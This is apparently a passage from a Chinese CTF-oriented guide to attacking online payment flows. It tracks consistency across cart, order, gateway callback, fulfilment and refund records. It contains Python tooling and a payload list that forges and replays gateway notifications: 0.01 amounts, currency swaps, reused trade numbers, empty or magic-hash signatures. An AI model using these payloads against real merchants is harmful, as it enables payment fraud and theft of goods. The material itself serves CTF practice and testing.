...
## 0. 支付全链状态机与一致性 Oracle

支付题的关键不是某个接口返回 `success`，而是六个账本是否一致：购物车、订单、支付网关、回调、发货、退款/对账。

```text
cart/quote → order → payment_intent → gateway_notify → fulfill → refund/reconcile
   |           |          |                 |             |           |
   price       total      gateway_amount     paid_amount   entitlement settlement
```

| 账本 | 关键字段 | 篡改入口 | 命中标志 | 失败样本 |
|---|---|---|---|---|
| cart/quote | `price`,`qty`,`discount`,`shipping` | 改金额/数量/优惠 | quote 接受异常金额 | order 重新按服务端价格计算 |
| order | `order_id`,`total`,`currency`,`status` | mass assignment / 状态回退 | 订单持久化低价或 `paid` | 只影响前端展示 |
| payment_intent | `amount`,`currency`,`channel` | 低价 intent / sandbox channel | 网关创建低价交易 | 网关金额恢复原价 |
| gateway_notify | `trade_no`,`out_trade_no`,`total_amount`,`sign` | 回调伪造/重放/规范化 | notify 后 order 变 paid | 回调验签或金额核对失败 |
| fulfill | `license`,`download`,`points`,`vip` | 跳步骤/重复发货 | 权益到账、flag 出现 | paid 但发货任务未触发 |
| refund/reconcile | `refund_amount`,`settlement_status` | 部分退款/双退/结算差 | 退款后权益仍有效或余额增加 | 退款撤销权益 |

```python
# payment_consistency_oracle.py — 支付链一致性检查
import requests
...
class PaymentOracle:
    ...
    def snapshot(self, order_id):
        endpoints = {
            ...
            "fulfill": f"/api/orders/{order_id}/entitlements",
            "refund": f"/api/refunds?order_id={order_id}",
        }
        snap = {}
        for name, path in endpoints.items():
            r = self.s.get(self.base + path, timeout=10)
            try:
                body = r.json()
            except Exception:
                body = r.text[:500]
            snap[name] = {"status": r.status_code, "body": body}
        return snap

    def is_paid_and_delivered(self, snap):
        text = str(snap).lower()
        return (
            ("paid" in text or "trade_success" in text)
            and any(x in text for x in ["license", "download", "entitlement", "vip", "flag{", "ctf{"])
        )
```
...
回调链重点看三件事：验签覆盖字段、`out_trade_no` 归属、`trade_no` 幂等。很多题不是签名算法弱，而是签名只覆盖了部分字段，或同一个 `trade_no` 能反复驱动状态。

```python
# notify_replay_matrix.py — 回调变体生成
CALLBACK_MUTATIONS = [
    {"trade_status": "TRADE_SUCCESS"},
    {"status": "paid"},
    {"payment_status": "success"},
    {"total_amount": "0.01"},
    {"amount": "0.01", "paid_amount": "100.00"},
    {"currency": "JPY", "total_amount": "1"},
    {"out_trade_no": "TARGET_ORDER", "order_id": "TARGET_ORDER"},
    {"trade_no": "REUSED_TRADE_NO"},
    {"trade_no": "NEW_TRADE_NO", "notify_id": "OLD_NOTIFY_ID"},
    {"sign": ""},
    {"sign": "0e462097431907509062922748828256"},
]

def mutate_callback(base):
    for m in CALLBACK_MUTATIONS:
        p = dict(base)
        p.update(m)
        yield p

def replay_notify(session, url, base_payload, times=3):
    results = []
    for i, payload in enumerate(mutate_callback(base_payload)):
...
| 缺陷 | Probe | 命中标志 |
|---|---|---|
| 金额未核对 | `total_amount=0.01` | 订单原价商品变 paid |
| 货币未核对 | `currency=JPY` / `VND` | 低价值货币到账 |
| 幂等缺失 | 同一 notify 重放 3 次 | 余额/权益/发货次数增加 |
| 订单归属缺失 | A 的回调带 B 的 `out_trade_no` | B 订单变 paid |
| 签名字段缺失 | 签名覆盖 `order_id` 但不覆盖 `amount/status` | 改金额或状态仍验签通过 |
| 异步时序 | cancelled 后 notify | cancelled → paid → fulfill |
